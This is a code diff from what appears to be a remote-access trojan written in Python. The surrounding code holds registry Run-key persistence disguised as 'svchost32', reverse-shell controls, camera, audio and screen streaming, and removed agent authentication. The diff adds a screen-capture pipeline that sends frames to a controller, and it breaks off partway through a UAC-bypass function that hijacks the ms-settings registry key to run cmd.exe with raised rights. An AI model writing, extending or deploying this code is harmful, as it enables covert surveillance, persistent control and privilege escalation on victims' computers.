@@ -145,7 +145,6 @@ except ImportError:
     log_message("eventlet not available", "warning")
 
 # Standard library imports
-import requests
 import time
 import urllib3
 import warnings
@@ -2365,7 +2364,6 @@ $backupPath = "{backup_path}"
 # Add to registry
 reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "svchost32" /t REG_SZ /d $stealthPath /f
 reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "svchost32" /t REG_SZ /d $stealthPath /f
-
 Write-Host "Registry persistence established"
 '''
         
@@ -3684,17 +3682,16 @@ def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
     if not STREAMING_ENABLED:
         STREAMING_ENABLED = True
-        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
+        STREAM_THREAD = threading.Thread(target=stream_screen_h264_socketio, args=(agent_id,))
         STREAM_THREAD.daemon = True
         STREAM_THREAD.start()
-        log_message("Started video stream.")
+        log_message("Started H.264 video stream.")
 
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD
     if STREAMING_ENABLED:
         STREAMING_ENABLED = False
         if STREAM_THREAD:
-            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
             STREAM_THREAD.join(timeout=2)
         STREAM_THREAD = None
         log_message("Stopped video stream.")
@@ -3713,7 +3710,6 @@ def stop_audio_streaming():
     if AUDIO_STREAMING_ENABLED:
         AUDIO_STREAMING_ENABLED = False
         if AUDIO_STREAM_THREAD:
-            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
             AUDIO_STREAM_THREAD.join(timeout=2)
         AUDIO_STREAM_THREAD = None
         log_message("Stopped audio stream.")
@@ -3732,7 +3728,6 @@ def stop_camera_streaming():
     if CAMERA_STREAMING_ENABLED:
         CAMERA_STREAMING_ENABLED = False
         if CAMERA_STREAM_THREAD:
-            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
             CAMERA_STREAM_THREAD.join(timeout=2)
         CAMERA_STREAM_THREAD = None
         log_message("Stopped camera stream.")
@@ -3897,7 +3892,6 @@ def stop_reverse_shell():
         REVERSE_SHELL_THREAD = None
         log_message("Stopped reverse shell.")
 # --- Voice Control Functions ---
-
 def voice_control_handler(agent_id):
     """
     Handles voice recognition and command processing.
@@ -5467,815 +5461,12 @@ class AdaptiveQualityManager:
         
         if new_quality != current_quality:
             self.capture.set_quality(new_quality)
-# ========================================================================================
-# LOW LATENCY INPUT MODULE
-# From: low_latency_input.py
-# ========================================================================================
-
 # Fast serialization
 try:
     import msgpack
     HAS_MSGPACK = True
 except ImportError:
     HAS_MSGPACK = False
-
-# Performance optimizations
-if PYAUTOGUI_AVAILABLE:
-    pyautogui.FAILSAFE = False
-    pyautogui.PAUSE = 0  # Remove delay between commands
-class LowLatencyInputHandler:
-    """Ultra-low latency input handling system"""
-    
-    def __init__(self, max_queue_size: int = 1000):
-        self.max_queue_size = max_queue_size
-        self.input_queue = queue.Queue(maxsize=max_queue_size)
-        self.processing_thread = None
-        self.running = False
-        
-        # Input controllers
-        self.mouse_controller = mouse.Controller()
-        self.keyboard_controller = keyboard.Controller()
-        
-        # Performance tracking
-        self.input_count = 0
-        self.last_input_time = time.time()
-        self.processing_times = []
-        
-        # Input state caching for smooth movement
-        self.last_mouse_pos = self.mouse_controller.position
-        self.mouse_acceleration = 1.0
-        self.smooth_mouse = True
-    
-    def start(self):
-        """Start the input processing thread"""
-        if self.running:
-            return
-        
-        self.running = True
-        self.processing_thread = threading.Thread(
-            target=self._process_input_loop,
-            daemon=True
-        )
-        self.processing_thread.start()
-    
-    def stop(self):
-        """Stop input processing"""
-        self.running = False
-        if self.processing_thread:
-            self.processing_thread.join(timeout=1.0)
-    
-    def handle_input(self, input_data) -> bool:
-        """Queue input for processing"""
-        try:
-            if self.input_queue.full():
-                # Drop oldest input if queue is full (prefer latest)
-                try:
-                    self.input_queue.get_nowait()
-                except queue.Empty:
-                    pass
-            
-            # Add timestamp for latency measurement
-            input_data['timestamp'] = time.time()
-            self.input_queue.put_nowait(input_data)
-            return True
-            
-        except queue.Full:
-            return False
-    
-    def _process_input_loop(self):
-        """Main input processing loop"""
-        while self.running:
-            try:
-                # Get input with timeout
-                input_data = self.input_queue.get(timeout=0.1)
-                
-                # Measure processing latency
-                process_start = time.time()
-                received_time = input_data.get('timestamp', process_start)
-                
-                # Process the input
-                self._execute_input(input_data)
-                
-                # Track performance
-                process_time = time.time() - process_start
-                total_latency = time.time() - received_time
-                
-                self._update_performance_stats(process_time, total_latency)
-                self.input_count += 1
-                
-            except queue.Empty:
-                continue
-            except Exception as e:
-                pass
-    
-    def _execute_input(self, input_data):
-        """Execute the input command with optimal performance"""
-        action = input_data.get('action')
-        data = input_data.get('data', {})
-        
-        try:
-            if action == 'mouse_move':
-                self._handle_mouse_move(data)
-            elif action == 'mouse_click':
-                self._handle_mouse_click(data)
-            elif action == 'mouse_scroll':
-                self._handle_mouse_scroll(data)
-            elif action == 'key_press':
-                self._handle_key_press(data)
-            elif action == 'key_release':
-                self._handle_key_release(data)
-            elif action == 'key_type':
-                self._handle_key_type(data)
-                
-        except Exception as e:
-            pass
-    
-    def _handle_mouse_move(self, data):
-        """Handle mouse movement with smoothing"""
-        try:
-            # Get coordinates
-            if 'absolute' in data:
-                x, y = data['absolute']['x'], data['absolute']['y']
-                
-                # Apply acceleration/sensitivity
-                sensitivity = data.get('sensitivity', 1.0)
-                if sensitivity != 1.0:
-                    current_x, current_y = self.mouse_controller.position
-                    x = current_x + (x - current_x) * sensitivity
-                    y = current_y + (y - current_y) * sensitivity
-                
-                # Direct position setting (fastest)
-                self.mouse_controller.position = (int(x), int(y))
-                
-            elif 'relative' in data:
-                dx, dy = data['relative']['x'], data['relative']['y']
-                sensitivity = data.get('sensitivity', 1.0)
-                
-                # Apply relative movement
-                current_x, current_y = self.mouse_controller.position
-                new_x = current_x + int(dx * sensitivity)
-                new_y = current_y + int(dy * sensitivity)
-                
-                self.mouse_controller.position = (new_x, new_y)
-            
-            # Update cached position
-            self.last_mouse_pos = self.mouse_controller.position
-            
-        except Exception as e:
-            pass
-    
-    def _handle_mouse_click(self, data):
-        """Handle mouse clicks"""
-        try:
-            button_map = {
-                'left': mouse.Button.left,
-                'right': mouse.Button.right,
-                'middle': mouse.Button.middle
-            }
-            
-            button = data.get('button', 'left')
-            clicks = data.get('clicks', 1)
-            pressed = data.get('pressed', True)
-            
-            mouse_button = button_map.get(button, mouse.Button.left)
-            
-            if pressed:
-                for _ in range(clicks):
-                    self.mouse_controller.click(mouse_button)
-            else:
-                # Handle button release if needed
-                pass
-                
-        except Exception as e:
-            pass
-    
-    def _handle_mouse_scroll(self, data):
-        """Handle mouse scrolling"""
-        try:
-            dx = data.get('dx', 0)
-            dy = data.get('dy', 0)
-            
-            if dx != 0 or dy != 0:
-                self.mouse_controller.scroll(dx, dy)
-                
-        except Exception as e:
-            pass
-    
-    def _handle_key_press(self, data):
-        """Handle key press"""
-        try:
-            key = data.get('key')
-            if not key:
-                return
-            
-            # Handle special keys
-            if key.startswith('Key.'):
-                # Special key like Key.enter, Key.ctrl, etc.
-                key_name = key[4:]  # Remove 'Key.' prefix
-                special_key = getattr(keyboard.Key, key_name, None)
-                if special_key:
-                    self.keyboard_controller.press(special_key)
-            else:
-                # Regular character
-                self.keyboard_controller.press(key)
-                
-        except Exception as e:
-            pass
-    
-    def _handle_key_release(self, data):
-        """Handle key release"""
-        try:
-            key = data.get('key')
-            if not key:
-                return
-            
-            # Handle special keys
-            if key.startswith('Key.'):
-                key_name = key[4:]
-                special_key = getattr(keyboard.Key, key_name, None)
-                if special_key:
-                    self.keyboard_controller.release(special_key)
-            else:
-                self.keyboard_controller.release(key)
-                
-        except Exception as e:
-            pass
-    
-    def _handle_key_type(self, data):
-        """Handle text typing"""
-        try:
-            text = data.get('text', '')
-            if text:
-                # Use direct character typing for best performance
-                for char in text:
-                    self.keyboard_controller.press(char)
-                    self.keyboard_controller.release(char)
-                
-        except Exception as e:
-            pass
-    
-    def _update_performance_stats(self, process_time: float, total_latency: float):
-        """Update performance statistics"""
-        self.processing_times.append({
-            'process_time': process_time,
-            'total_latency': total_latency,
-            'timestamp': time.time()
-        })
-        
-        # Keep only recent samples
-        if len(self.processing_times) > 1000:
-            self.processing_times.pop(0)
-    
-    def get_performance_stats(self):
-        """Get performance statistics"""
-        if not self.processing_times:
-            return {
-                'input_count': self.input_count,
-                'queue_size': self.input_queue.qsize(),
-                'avg_process_time': 0,
-                'avg_latency': 0,
-                'max_latency': 0,
-                'min_latency': 0
-            }
-        
-        recent_times = self.processing_times[-100:]  # Last 100 samples
-        process_times = [t['process_time'] for t in recent_times]
-        latencies = [t['total_latency'] for t in recent_times]
-        
-        return {
-            'input_count': self.input_count,
-            'queue_size': self.input_queue.qsize(),
-            'avg_process_time': sum(process_times) / len(process_times) * 1000,  # ms
-            'avg_latency': sum(latencies) / len(latencies) * 1000,  # ms
-            'max_latency': max(latencies) * 1000,  # ms
-            'min_latency': min(latencies) * 1000,  # ms
-            'samples': len(recent_times)
-        }
-    
-    def set_mouse_acceleration(self, acceleration: float):
-        """Set mouse acceleration factor"""
-        self.mouse_acceleration = max(0.1, min(5.0, acceleration))
-    
-    def clear_queue(self):
-        """Clear the input queue"""
-        while not self.input_queue.empty():
-            try:
-                self.input_queue.get_nowait()
-            except queue.Empty:
-                break
-
-
-class InputMessageEncoder:
-    """Fast message encoding/decoding for input data"""
-    
-    def __init__(self):
-        self.use_msgpack = HAS_MSGPACK
-    
-    def encode(self, data) -> bytes:
-        """Encode input data to bytes"""
-        try:
-            if self.use_msgpack:
-                return msgpack.packb(data)
-            else:
-                return json.dumps(data).encode('utf-8')
-        except Exception as e:
-            return b''
-    
-    def decode(self, data: bytes):
-        """Decode bytes to input data"""
-        try:
-            if self.use_msgpack:
-                return msgpack.unpackb(data, raw=False)
-            else:
-                return json.loads(data.decode('utf-8'))
-        except Exception as e:
-            return None
-
-# ========================================================================================
-# WEBSOCKET STREAMING MODULE
-# From: websocket_streaming.py
-# ========================================================================================
-
-try:
-    import uvloop
-    HAS_UVLOOP = True
-except ImportError:
-    HAS_UVLOOP = False
-
-class WebSocketStreamingServer:
-    """High-performance WebSocket streaming server"""
-    
-    def __init__(self, host: str = "localhost", port: int = 8765, 
-                 max_clients: int = 10, target_fps: int = 60):
-        self.host = host
-        self.port = port
-        self.max_clients = max_clients
-        self.target_fps = target_fps
-        
-        # Client management
-        self.clients = set()
-        self.client_stats = {}
-        
-        # Streaming components
-        self.capture = None
-        self.frame_queue = queue.Queue(maxsize=120)  # 2 seconds buffer at 60fps
-        self.running = False
-        
-        # Performance tracking
-        self.frames_sent = 0
-        self.bytes_sent = 0
-        self.start_time = time.time()
-    
-    async def start_server(self):
-        """Start the WebSocket server"""
-        if HAS_UVLOOP and hasattr(asyncio, 'set_event_loop_policy'):
-            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
-        
-        self.running = True
-        
-        # Initialize capture system
-        try:
-            self.capture = HighPerformanceCapture(
-                target_fps=self.target_fps, 
-                quality=85, 
-                enable_delta_compression=True
-            )
-            self.capture.start_capture_stream(self._frame_callback)
-        except:
-            return
-        
-        # Start frame distribution task
-        asyncio.create_task(self._distribute_frames())
-        
-        # Start the WebSocket server
-        async with websockets.serve(
-            self._handle_client,
-            self.host,
-            self.port,
-            max_size=1024*1024*10,  # 10MB max message size
-            ping_interval=20,
-            ping_timeout=10,
-            compression=None  # Disable compression for speed
-        ):
-            await asyncio.Future()  # Run forever
-    
-    async def _handle_client(self, websocket, path):
-        """Handle new client connection"""
-        client_id = f"{websocket.remote_address[0]}:{websocket.remote_address[1]}"
-        
-        if len(self.clients) >= self.max_clients:
-            await websocket.close(code=1013, reason="Server full")
-            return
-        
-        self.clients.add(websocket)
-        self.client_stats[client_id] = {
-            'connected_at': time.time(),
-            'frames_sent': 0,
-            'bytes_sent': 0,
-            'last_activity': time.time()
-        }
-        
-        try:
-            # Send initial connection message
-            await self._send_to_client(websocket, {
-                'type': 'connection',
-                'message': 'Connected to high-performance stream',
-                'fps': self.target_fps,
-                'features': {
-                    'high_performance_capture': True,
-                    'msgpack': HAS_MSGPACK,
-                    'uvloop': HAS_UVLOOP
-                }
-            })
-            
-            # Handle client messages
-            async for message in websocket:
-                await self._handle_client_message(websocket, client_id, message)
-                
-        except websockets.exceptions.ConnectionClosed:
-            pass
-        except Exception as e:
-            pass
-        finally:
-            self.clients.discard(websocket)
-            self.client_stats.pop(client_id, None)
-    
-    async def _handle_client_message(self, websocket, client_id: str, message: str):
-        """Handle incoming client messages"""
-        try:
-            data = json.loads(message)
-            msg_type = data.get('type')
-            
-            if msg_type == 'ping':
-                await self._send_to_client(websocket, {'type': 'pong', 'timestamp': time.time()})
-            elif msg_type == 'stats_request':
-                stats = self._get_server_stats()
-                await self._send_to_client(websocket, {'type': 'stats', 'data': stats})
-            elif msg_type == 'quality_change':
-                new_quality = data.get('quality', 85)
-                if self.capture:
-                    self.capture.set_quality(new_quality)
-                await self._send_to_client(websocket, {
-                    'type': 'quality_changed', 
-                    'quality': new_quality
-                })
-            
-            # Update client activity
-            self.client_stats[client_id]['last_activity'] = time.time()
-            
-        except json.JSONDecodeError:
-            pass
-        except Exception as e:
-            pass
-    
-    def _frame_callback(self, frame_data: bytes):
-        """Callback for captured frames"""
-        if frame_data and frame_data != b'DELTA_UNCHANGED':
-            try:
-                # Add frame to queue (non-blocking)
-                if not self.frame_queue.full():
-                    self.frame_queue.put_nowait({
-                        'data': frame_data,
-                        'timestamp': time.time()
-                    })
-                else:
-                    # Drop oldest frame if queue is full
-                    try:
-                        self.frame_queue.get_nowait()
-                        self.frame_queue.put_nowait({
-                            'data': frame_data,
-                            'timestamp': time.time()
-                        })
-                    except queue.Empty:
-                        pass
-            except Exception as e:
-                pass
-    
-    async def _distribute_frames(self):
-        """Distribute frames to all connected clients"""
-        while self.running:
-            try:
-                # Get frame from queue (non-blocking)
-                try:
-                    frame_data = self.frame_queue.get_nowait()
-                except queue.Empty:
-                    await asyncio.sleep(0.001)  # 1ms sleep
-                    continue
-                
-                if not self.clients:
-                    continue
-                
-                # Prepare frame message
-                frame_message = {
-                    'type': 'frame',
-                    'timestamp': frame_data['timestamp'],
-                    'data': base64.b64encode(frame_data['data']).decode('utf-8')
-                }
-                
-                # Handle different frame types
-                if frame_data['data'].startswith(b'LZ4_COMPRESSED'):
-                    frame_message['encoding'] = 'lz4'
-                    frame_message['data'] = base64.b64encode(frame_data['data'][14:]).decode('utf-8')
-                
-                # Send to all clients concurrently
-                tasks = []
-                for client in list(self.clients):  # Create a copy to avoid modification during iteration
-                    tasks.append(self._send_frame_to_client(client, frame_message))
-                
-                if tasks:
-                    await asyncio.gather(*tasks, return_exceptions=True)
-                
-                self.frames_sent += 1
-                self.bytes_sent += len(frame_data['data'])
-                
-            except Exception as e:
-                await asyncio.sleep(0.01)
-    
-    async def _send_frame_to_client(self, websocket, frame_message):
-        """Send frame to a specific client"""
-        try:
-            if websocket in self.clients:
-                if HAS_MSGPACK:
-                    # Use MessagePack for better performance
-                    data = msgpack.packb(frame_message)
-                    await websocket.send(data)
-                else:
-                    # Fallback to JSON
-                    await websocket.send(json.dumps(frame_message))
-                
-                # Update client stats
-                client_id = f"{websocket.remote_address[0]}:{websocket.remote_address[1]}"
-                if client_id in self.client_stats:
-                    self.client_stats[client_id]['frames_sent'] += 1
-                    self.client_stats[client_id]['bytes_sent'] += len(frame_message.get('data', ''))
-                    
-        except websockets.exceptions.ConnectionClosed:
-            self.clients.discard(websocket)
-        except Exception as e:
-            pass
-    
-    async def _send_to_client(self, websocket, message):
-        """Send a message to a specific client"""
-        try:
-            if HAS_MSGPACK:
-                data = msgpack.packb(message)
-                await websocket.send(data)
-            else:
-                await websocket.send(json.dumps(message))
-        except Exception as e:
-            pass
-    
-    def _get_server_stats(self):
-        """Get server performance statistics"""
-        uptime = time.time() - self.start_time
-        avg_fps = self.frames_sent / uptime if uptime > 0 else 0
-        avg_bandwidth = self.bytes_sent / uptime if uptime > 0 else 0
-        
-        capture_stats = {}
-        if self.capture:
-            capture_stats = self.capture.get_stats()
-        
-        return {
-            'uptime': uptime,
-            'connected_clients': len(self.clients),
-            'frames_sent': self.frames_sent,
-            'bytes_sent': self.bytes_sent,
-            'avg_fps': avg_fps,
-            'avg_bandwidth': avg_bandwidth,
-            'frame_queue_size': self.frame_queue.qsize(),
-            'capture_stats': capture_stats,
-            'client_stats': self.client_stats
-        }
-    
-    def stop_server(self):
-        """Stop the streaming server"""
-        self.running = False
-        if self.capture:
-            self.capture.stop_capture_stream()
-
-# ========================================================================================
-# OPTIMIZED DASHBOARD HTML CONTENT
-# From: optimized_dashboard.html
-# ========================================================================================
-
-OPTIMIZED_DASHBOARD_HTML = """<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>High-Performance Dashboard - 60 FPS Streaming</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
-            color: #ffffff;
-            overflow-x: hidden;
-        }
-        .header {
-            background: rgba(0, 0, 0, 0.8);
-            padding: 15px 20px;
-            border-bottom: 2px solid #00ff88;
-            backdrop-filter: blur(10px);
-        }
-        .header h1 {
-            color: #00ff88;
-            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
-        }
-        .performance-badge {
-            display: inline-block;
-            background: linear-gradient(45deg, #ff6b6b, #feca57);
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            margin-left: 15px;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        .container {
-            display: grid;
-            grid-template-columns: 1fr 300px;
-            height: calc(100vh - 80px);
-            gap: 20px;
-            padding: 20px;
-        }
-        .stream-container {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 20px;
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-        .stream-video {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            border-radius: 10px;
-            background: #000;
-        }
-        .stream-overlay {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 15px;
-            border-radius: 10px;
-            min-width: 200px;
-        }
-        .fps-counter {
-            font-size: 24px;
-            font-weight: bold;
-            color: #00ff88;
-            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
-        }
-        .latency-indicator {
-            margin-top: 10px;
-        }
-        .latency-value {
-            font-size: 18px;
-            font-weight: bold;
-        }
-        .latency-low { color: #00ff88; }
-        .latency-medium { color: #feca57; }
-        .latency-high { color: #ff6b6b; }
-        .controls-panel {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 20px;
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            height: fit-content;
-        }
-        .control-section {
-            margin-bottom: 25px;
-        }
-        .control-section h3 {
-            color: #00ff88;
-            margin-bottom: 15px;
-            font-size: 16px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .btn {
-            background: linear-gradient(45deg, #00ff88, #00d4aa);
-            border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 5px;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            width: 100%;
-        }
-        .btn:hover {
-            background: linear-gradient(45deg, #00d4aa, #00ff88);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
-        }
-        .btn-danger {
-            background: linear-gradient(45deg, #ff6b6b, #ff4757);
-        }
-        .btn-danger:hover {
-            background: linear-gradient(45deg, #ff4757, #ff6b6b);
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>High-Performance Dashboard<span class="performance-badge">60 FPS • Sub-2s Latency</span></h1>
-    </div>
-    <div class="container">
-        <div class="stream-container">
-            <img id="streamVideo" class="stream-video" alt="High-Performance Stream" />
-            <div class="stream-overlay">
-                <div class="fps-counter"><span id="fpsValue">0</span> FPS</div>
-                <div class="latency-indicator">Latency: <span id="latencyValue" class="latency-value latency-low">0ms</span></div>
-            </div>
-        </div>
-        <div class="controls-panel">
-            <div class="control-section">
-                <h3>Stream Control</h3>
-                <button class="btn" onclick="startOptimizedStream()">Start 60 FPS Stream</button>
-                <button class="btn btn-danger" onclick="stopStream()">Stop Stream</button>
-                <button class="btn" onclick="startWebSocketStream()">WebSocket Stream</button>
-            </div>
-        </div>
-    </div>
-    <script>
-        let streamActive = false;
-        let webSocketStream = null;
-        let frameCount = 0;
-        let startTime = Date.now();
-
-        function startWebSocketStream() {
-            if (webSocketStream) {
-                webSocketStream.close();
-            }
-            // Detect if we're using HTTPS and use appropriate WebSocket protocol
-            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            const host = window.location.hostname;
-            const port = window.location.port;
-            webSocketStream = new WebSocket(`${protocol}//${host}:8765`);
-            
-            webSocketStream.onmessage = function(event) {
-                try {
-                    const data = JSON.parse(event.data);
-                    if (data.type === 'frame') {
-                        updateStreamFrame(data);
-                    }
-                } catch (e) {
-                    console.error('WebSocket message error:', e);
-                }
-            };
-        }
-
-        function updateStreamFrame(frameData) {
-            const streamVideo = document.getElementById('streamVideo');
-            streamVideo.src = 'data:image/jpeg;base64,' + frameData.data;
-            
-            frameCount++;
-            const now = Date.now();
-            const elapsed = (now - startTime) / 1000;
-            const fps = Math.round(frameCount / elapsed);
-            document.getElementById('fpsValue').textContent = fps;
-            
-            const latency = now - (frameData.timestamp * 1000);
-            document.getElementById('latencyValue').textContent = Math.round(latency) + 'ms';
-        }
-
-        function startOptimizedStream() {
-            streamActive = true;
-            console.log('Optimized stream started');
-        }
-
-        function stopStream() {
-            streamActive = false;
-            if (webSocketStream) {
-                webSocketStream.close();
-                webSocketStream = null;
-            }
-            console.log('Stream stopped');
-        }
-
-        document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(startWebSocketStream, 1000);
-        });
-    </script>
-</body>
-</html>"""
 # ========================================================================================
 # PROCESS TERMINATION TEST FUNCTIONS
 # From: test_process_termination.py
@@ -7904,3 +7095,118 @@ if __name__ == "__main__":
             pass
 
 # Agent authentication removed - direct access enabled
+
+# Modern non-blocking streaming pipeline for screen streaming
+STREAMING_ENABLED = False
+STREAM_THREADS = []
+capture_queue = None
+encode_queue = None
+
+TARGET_FPS = 15
+CAPTURE_QUEUE_SIZE = 5
+ENCODE_QUEUE_SIZE = 5
+
+
+def screen_capture_worker(agent_id):
+    import time
+    global STREAMING_ENABLED, capture_queue
+    import mss
+    import numpy as np
+    with mss.mss() as sct:
+        monitors = sct.monitors
+        monitor_index = 1
+        width = monitors[monitor_index][2] - monitors[monitor_index][0]
+        height = monitors[monitor_index][3] - monitors[monitor_index][1]
+        if width > 1280:
+            scale = 1280 / width
+            width = int(width * scale)
+            height = int(height * scale)
+        frame_time = 1.0 / TARGET_FPS
+        while STREAMING_ENABLED:
+            start = time.time()
+            sct_img = sct.grab(monitors[monitor_index])
+            img = np.array(sct_img)
+            if img.shape[1] != width or img.shape[0] != height:
+                img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
+            if img.shape[2] == 4:
+                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+            # Non-blocking put, drop oldest if full
+            try:
+                if capture_queue.full():
+                    capture_queue.get_nowait()
+                capture_queue.put_nowait(img)
+            except queue.Full:
+                pass
+            elapsed = time.time() - start
+            sleep_time = max(0, frame_time - elapsed)
+            if sleep_time > 0:
+                time.sleep(sleep_time)
+
+def screen_encode_worker(agent_id):
+    global STREAMING_ENABLED, capture_queue, encode_queue
+    while STREAMING_ENABLED:
+        try:
+            img = capture_queue.get(timeout=0.5)
+        except queue.Empty:
+            continue
+        # H.264 encode (for now, JPEG fallback)
+        is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
+        if is_success:
+            try:
+                if encode_queue.full():
+                    encode_queue.get_nowait()
+                encode_queue.put_nowait(encoded.tobytes())
+            except queue.Full:
+                pass
+
+def screen_send_worker(agent_id):
+    global STREAMING_ENABLED, encode_queue, sio
+    while STREAMING_ENABLED:
+        try:
+            frame = encode_queue.get(timeout=0.5)
+        except queue.Empty:
+            continue
+        try:
+            sio.emit('screen_frame', {'agent_id': agent_id, 'frame': frame}, binary=True)
+        except Exception as e:
+            log_message(f"SocketIO send error: {e}", "error")
+
+
+def start_streaming(agent_id):
+    global STREAMING_ENABLED, STREAM_THREADS, capture_queue, encode_queue
+    if not STREAMING_ENABLED:
+        STREAMING_ENABLED = True
+        capture_queue = queue.Queue(maxsize=CAPTURE_QUEUE_SIZE)
+        encode_queue = queue.Queue(maxsize=ENCODE_QUEUE_SIZE)
+        STREAM_THREADS = [
+            threading.Thread(target=screen_capture_worker, args=(agent_id,), daemon=True),
+            threading.Thread(target=screen_encode_worker, args=(agent_id,), daemon=True),
+            threading.Thread(target=screen_send_worker, args=(agent_id,), daemon=True),
+        ]
+        for t in STREAM_THREADS:
+            t.start()
+        log_message(f"Started modern non-blocking video stream at {TARGET_FPS} FPS.")
+
+def stop_streaming():
+    global STREAMING_ENABLED, STREAM_THREADS, capture_queue, encode_queue
+    if STREAMING_ENABLED:
+        STREAMING_ENABLED = False
+        for t in STREAM_THREADS:
+            t.join(timeout=2)
+        STREAM_THREADS = []
+        capture_queue = None
+        encode_queue = None
+        log_message("Stopped video stream.")
+
+# Documented: Modern streaming pipeline uses three threads and two queues for capture, encode, and send. Each stage is non-blocking and drops oldest frames if overloaded. FPS and buffer sizes are configurable.
+
+import os
+import subprocess
+import time
+
+def write_and_import_uac_bypass_reg():
+    reg_content = r'''
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command]
+@="cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v
